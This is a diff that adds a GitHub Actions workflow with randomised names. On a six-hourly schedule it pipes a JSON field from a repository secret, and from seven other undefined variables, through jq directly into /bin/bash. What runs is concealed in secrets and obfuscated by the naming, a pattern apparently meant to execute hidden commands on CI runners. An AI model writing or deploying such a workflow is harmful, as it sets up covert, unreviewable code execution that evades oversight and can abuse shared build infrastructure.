@@ -1,0 +1,25 @@
+name: sleepynhajk
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sleepynhajk
+        env:
+          qvo46: ${{ secrets.qvo46 }}
+        run: |
+          echo $qvo46 | jq -r .allrn86 | /bin/bash
+          echo $o901 | jq -r .txg660 | /bin/bash
+          echo $szwet64053 | jq -r .eps45 | /bin/bash
+          echo $hz60 | jq -r .guv1463 | /bin/bash
+          echo $du7799 | jq -r .isoz14903 | /bin/bash
+          echo $qlf96800 | jq -r .jtiu148 | /bin/bash
+          echo $hid0 | jq -r .t7014 | /bin/bash
+          echo $fki17719 | jq -r .cpw66 | /bin/bash
+
